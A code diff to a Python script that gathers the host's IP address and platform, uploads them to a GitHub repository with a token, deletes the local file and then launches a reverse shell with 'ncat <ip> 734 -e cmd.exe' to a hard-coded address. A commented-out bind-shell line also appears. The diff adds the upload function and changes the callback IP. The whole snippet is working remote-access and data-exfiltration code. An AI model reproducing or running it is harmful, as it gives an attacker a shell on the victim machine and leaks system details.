@@ -5,6 +5,7 @@ import socket
 import json
 import base64
 import requests
+import github
 
 def create_file(file_path, content):
     with open(file_path, "w", encoding="utf-8") as file:
@@ -13,15 +14,19 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
+def update_file(token, content):
     url = f"https://api.github.com/repos/kaki714/Not/contents/data/data.txt"
-  
-  
+    g = github.Github(token)
+    
+    repo = g.get_user().get_repo("Not")
+    file = repo.get_file_contents("/"+content)
+    repo.update_file("/"+content, "test", "test?content", file.sha)
         
 
 def run(token):
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
-    iph='172.16.21.110'
+    iph='192.168.1.212'
     fname="data.txt"
     print('')
     print(' ############### # # # ##############')
@@ -46,8 +51,8 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
         print("text stmnt: "+ stmnt)
         create_file(fname,stmnt)
-        
-        delete_file("data.txt")
+        update_file(token,fname)
+        delete_file(fname)
         
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
